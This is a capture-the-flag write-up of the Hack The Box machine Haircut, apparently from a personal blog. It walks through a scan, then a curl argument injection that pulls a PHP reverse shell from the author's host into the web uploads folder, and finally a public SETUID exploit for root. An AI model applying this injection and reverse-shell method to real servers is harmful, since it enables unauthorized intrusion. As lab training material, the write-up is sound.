---
title:     "Hack The Box - Haircut"
tags: [linux,medium,curl]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/1.png)

We are going to pwn Haircut from Hack The Box.

Link :<https://www.hackthebox.eu/home/machines/profile/21>


Lets Begin with our Initial Nmap Scan.

Nmap Scan Results:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/2.png)
Looks like normal webpage, Lets try bruteforcing the directories and look for anything interesting.

## Gobuster Results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/21 18:36:57 Starting gobuster
===============================================================
/index.html (Status: 200)
/uploads (Status: 301)
/test.html (Status: 200)
/hair.html (Status: 200)
/exposed.php (Status: 200)
===============================================================
2020/01/21 18:39:38 Finished
===============================================================
```

``/exposed.php`` 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/3.png)

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/4.png)
``curl`` is running in the server so lets interrupt the request in the ``burp`` and see what going on.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/5.png)
So by using ``curl`` we need to inject our payload inorder to get shell.

There is a way to upload reverse shell to the box using ``curl`` 
I started my HTTP server with ``Reverse PHP shell `` And we already know there is ``/uploads`` directory. 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/6.png)

```
http://10.10.14.17:8000/shell.php -o /var/www/html/uploads/shell.php

-o will Write the file in /uploads/
```
Now lets start our listener and open the ``shell.php`` in the ``/uploads``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/7.png)

We got the shell.


## Privilege Escalation:

I upload my Linux Enumeration Script and I found an SETUID binary
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/8.png)

There is an exploit available for this version.

> https://www.exploit-db.com/exploits/41154

Downloaded the script and tried executing it leads to some error , So I split the script into 3

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/9.png)

Did the commands given from the script as manually.

> gcc -fPIC -shared -ldl -o exploit.so exploit.c 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/10.png)

>gcc -o rootshell rootshell.c

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/11.png)

Then I uploaded all the scripts to the box
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/12.png)

And executed the last script ``root.sh``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/13.png)

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/14.png)
Got Root






